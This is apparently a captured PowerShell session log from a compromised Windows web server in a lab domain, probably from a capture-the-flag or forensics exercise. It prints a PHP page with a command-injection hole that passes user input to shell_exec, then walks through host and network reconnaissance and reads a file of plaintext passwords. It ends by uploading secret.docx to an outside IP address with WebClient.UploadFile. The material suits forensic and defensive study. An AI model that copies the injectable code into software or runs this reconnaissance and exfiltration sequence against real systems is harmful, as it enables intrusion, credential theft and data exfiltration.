@@ -1,0 +1,299 @@
+rPS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> dir 
+
+    Directory: C:\Users\web\xampp\htdocs
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         5/18/2020  12:06 AM       1091 index.php                         
+-a---         5/18/2020  12:06 AM       1605 login.php                         
+
+
+PS C:\Users\web\xampp\htdocs> whoami web\web
+PS C:\Users\web\xampp\htdocs> ipconfig /all 
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : web
+   Primary Dns Suffix  . . . . . . . : macaca.lab
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : macaca.lab
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter #2
+   Physical Address. . . . . . . . . : 08-00-27-4A-45-FF
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::9ca7:f8a7:ad23:486e%13(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.168.77.30(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.77.1
+   DHCPv6 IAID . . . . . . . . . . . : 302514215
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-1C-49-EC-FD-08-00-27-F8-06-51
+   DNS Servers . . . . . . . . . . . : 192.168.77.10
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter
+   Physical Address. . . . . . . . . : 08-00-27-8C-D3-AD
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::4c30:2cb6:5030:de2d%11(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 10.0.2.15(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Wednesday, June 10, 2020 6:51:18 AM
+   Lease Expires . . . . . . . . . . : Friday, October 16, 2020 12:00:14 AM
+   Default Gateway . . . . . . . . . : 10.0.2.2
+   DHCP Server . . . . . . . . . . . : 10.0.2.2
+   DHCPv6 IAID . . . . . . . . . . . : 235405351
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-1C-49-EC-FD-08-00-27-F8-06-51
+   DNS Servers . . . . . . . . . . . : 10.0.2.3
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Tunnel adapter isatap.{8C594C8A-F49E-4726-BECD-10EBABCD2E05}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+
+Tunnel adapter isatap.{B748B622-3D57-43B2-923C-DFBBCAE7B560}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> systeminfo 
+Host Name:                 WEB
+OS Name:                   Microsoft Windows 7 Professional 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          
+Registered Organization:   
+Product ID:                00371-222-5730686-86056
+Original Install Date:     1/15/2015, 1:45:05 PM
+System Boot Time:          10/13/2020, 9:09:16 PM
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3600 Mhz
+BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,216 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,123 MB
+Virtual Memory: In Use:    972 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    macaca.lab
+Logon Server:              \\WEB
+Hotfix(s):                 N/A
+Network Card(s):           2 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.0.2.2
+                                 IP address(es)
+                                 [01]: 10.0.2.15
+                                 [02]: fe80::4c30:2cb6:5030:de2d
+                           [02]: Intel(R) PRO/1000 MT Desktop Adapter
+                                 Connection Name: Local Area Connection 2
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 192.168.77.30
+                                 [02]: fe80::9ca7:f8a7:ad23:486e
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> arp -a 
+Interface: 10.0.2.15 --- 0xb
+  Internet Address      Physical Address      Type
+  10.0.2.2              52-54-00-12-35-02     dynamic   
+  10.0.2.3              52-54-00-12-35-03     dynamic   
+  10.0.2.255            ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+  255.255.255.255       ff-ff-ff-ff-ff-ff     static    
+
+Interface: 192.168.77.30 --- 0xd
+  Internet Address      Physical Address      Type
+  192.168.77.1          0a-00-27-00-00-15     dynamic   
+  192.168.77.10         08-00-27-04-05-33     dynamic   
+  192.168.77.20         08-00-27-d7-77-45     dynamic   
+  192.168.77.40         08-00-27-07-7b-03     dynamic   
+  192.168.77.255        ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static    
+  224.0.0.252           01-00-5e-00-00-fc     static    
+  239.255.255.250       01-00-5e-7f-ff-fa     static    
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> nslookup 192.168.77.10 Server:  dc.macaca.lab
+Address:  192.168.77.10
+
+Name:    dc.macaca.lab
+Address:  192.168.77.10
+
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> nslookup 192.168.77.20 Server:  dc.macaca.lab
+Address:  192.168.77.10
+
+Name:    ftp.macaca.lab
+Address:  192.168.77.20
+
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> nslookup 192.168.77.40 Server:  dc.macaca.lab
+Address:  192.168.77.10
+
+Name:    pc01.macaca.lab
+Address:  192.168.77.40
+
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> dir 
+
+    Directory: C:\Users\web\xampp\htdocs
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---         5/18/2020  12:06 AM       1091 index.php                         
+-a---         5/18/2020  12:06 AM       1605 login.php                         
+
+
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> cat index.php <?php
+  session_start();
+  if(!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
+    header('Location: /login.php');
+    die('QQ');
+  }
+?>
+
+<html lang="en">
+  <head> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  </head>
+  <body>
+    <form class="form-inline" method="POST">
+      <div class="form-group mb-2 mt-2">
+        <label class="col-sm-2 col-form-label" for="inputIp">Ping</label>
+        <div class="col-sm-10">
+          <input class="form-control" name="ip" placeholder="8.8.8.8" type="text">
+        </div>
+      </div>
+      <button class="btn btn-primary mb-2 mt-2" type="submit">submit</button>
+    </form>
+    <?php
+      if(isset($_POST["ip"])) {
+          $cmd = shell_exec("ping " . $_POST["ip"]);
+          echo "<pre>" . $cmd . "</pre>";
+      }
+    ?>
+  </body>
+</html>
+PS C:\Users\web\xampp\htdocs>  PS C:\Users\web\xampp\htdocs> cd C:\Users\web PS C:\Users\web>  PS C:\Users\web> dir 
+
+    Directory: C:\Users\web
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d-r--         5/18/2020   8:48 AM            Contacts                          
+d-r--        10/15/2020   7:33 AM            Desktop                           
+d-r--         5/18/2020   8:49 AM            Documents                         
+d-r--        10/15/2020   7:33 AM            Downloads                         
+d-r--         5/18/2020   8:49 AM            Favorites                         
+d-r--         5/18/2020   8:49 AM            Links                             
+d-r--         5/18/2020   8:48 AM            Music                             
+d-r--         5/18/2020   8:48 AM            Pictures                          
+d-r--         5/18/2020   8:49 AM            Saved Games                       
+d-r--         5/18/2020   8:49 AM            Searches                          
+d-r--         5/18/2020   8:48 AM            Videos                            
+d----         5/18/2020   8:55 AM            xampp                             
+
+
+PS C:\Users\web>  PS C:\Users\web> cd Desktop PS C:\Users\web\Desktop>  PS C:\Users\web\Desktop> dir 
+
+    Directory: C:\Users\web\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----        10/15/2020   7:33 AM            _                                 
+
+
+PS C:\Users\web\Desktop>  PS C:\Users\web\Desktop> cd _ PS C:\Users\web\Desktop\_> dir 
+
+    Directory: C:\Users\web\Desktop\_
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/15/2020   7:26 AM         46 passwords.txt                     
+
+
+PS C:\Users\web\Desktop\_>  PS C:\Users\web\Desktop\_> cat passwords.txt ftp:p@ssw0rd
+docx:m4c4c4hu6
+sso:ji32k7au4a83
+PS C:\Users\web\Desktop\_>  PS C:\Users\web\Desktop\_> cd ..\..\ PS C:\Users\web>  PS C:\Users\web> dir 
+
+    Directory: C:\Users\web
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d-r--         5/18/2020   8:48 AM            Contacts                          
+d-r--        10/15/2020   7:33 AM            Desktop                           
+d-r--         5/18/2020   8:49 AM            Documents                         
+d-r--        10/15/2020   7:33 AM            Downloads                         
+d-r--         5/18/2020   8:49 AM            Favorites                         
+d-r--         5/18/2020   8:49 AM            Links                             
+d-r--         5/18/2020   8:48 AM            Music                             
+d-r--         5/18/2020   8:48 AM            Pictures                          
+d-r--         5/18/2020   8:49 AM            Saved Games                       
+d-r--         5/18/2020   8:49 AM            Searches                          
+d-r--         5/18/2020   8:48 AM            Videos                            
+d----         5/18/2020   8:55 AM            xampp                             
+
+
+PS C:\Users\web>  PS C:\Users\web> cd Downloads PS C:\Users\web\Downloads>  PS C:\Users\web\Downloads> dir 
+
+    Directory: C:\Users\web\Downloads
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/15/2020   7:26 AM      88576 secret.docx                       
+
+
+PS C:\Users\web\Downloads>  PS C:\Users\web\Downloads> $wc = New-Object System.Net.WebClient PS C:\Users\web\Downloads> $wc 
+
+Encoding              : System.Text.SBCSCodePageEncoding
+BaseAddress           : 
+Credentials           : 
+UseDefaultCredentials : False
+Headers               : {}
+QueryString           : {}
+ResponseHeaders       : 
+Proxy                 : System.Net.WebRequest+WebProxyWrapper
+CachePolicy           : 
+IsBusy                : False
+Site                  : 
+Container             : 
+
+
+
+PS C:\Users\web\Downloads>  PS C:\Users\web\Downloads> $wc.UploadFile("http://45.79.159.73:42794", "post", "C:\Users\web\Downloads\secret.docx") 48
+PS C:\Users\web\Downloads>  PS C:\Users\web\Downloads> 
